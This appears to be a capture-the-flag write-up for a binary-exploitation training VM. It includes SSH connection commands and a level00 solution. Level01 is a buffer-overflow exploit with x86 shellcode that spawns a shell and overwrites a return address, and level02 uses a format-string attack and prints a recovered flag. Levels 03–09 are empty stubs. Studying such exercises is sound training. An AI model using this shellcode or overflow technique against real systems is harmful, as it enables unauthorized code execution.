## Some commands

```shell
./scripts/startVM.sh
export OR_HOST=192.168.1.70
export OR_PORT=4242

./scripts/installUtils.sh

ssh -q level00@$OR_HOST -p $OR_PORT
sshpass -f level00/flag ssh level1@$OR_HOST -p $OR_PORT

scp -q -P $OR_PORT -r <FILE> level00@$OR_HOST:/tmp/<FILE>
```

---

## Level00 - Disassemble and find the solution

### Resolve

Just put `5276` (`0x149c`) in the scanf prompt. Then the shell is executed.

```shell
(echo 5276; cat) | ~/level00
```

---

## Level01 - Buffer overflow

The second prompt `fgets` takes 0x64 bytes, but the buffer can only takes 0x48

### Resolve

```shell
b*main+169
run < <(python -c 'print "dat_wil\n" + "A" * 0x48')
x/24x $esp+0x1c
p 0x48 + 8
$3 = 0x50 # => offset

export SHELLCODE=`python -c "print '\x90' * 0xff + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`

./getenv32 SHELLCODE ~/level01
  0xffffd755

python -c 'print "dat_wil\n" + "A" * 0x50 + "\x55\xd7\xff\xff"' > /tmp/exploit01

cat /tmp/exploit01 - | ~/level01
```

---

## Level02 - 64 bits - Format string attack

printf prints directly the variable `username`

We don't know exactly the position of the the flag, we will use a format string attack to find the flag. We will test several position using a loop

### Resolve

```shell
./script.sh

(echo -e "AAA\nHh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H"; cat) | ~/level02
```

---

## Level03 -

### Resolve

```shell

```

---

## Level04 -

### Resolve

```shell

```

---

## Level05 -

### Resolve

```shell

```

---

## Level06 -

### Resolve

```shell

```

---

## Level07 -

### Resolve

```shell

```

---

## Level08 -

### Resolve

```shell

```

---

## Level09 -

### Resolve

```shell

```

---
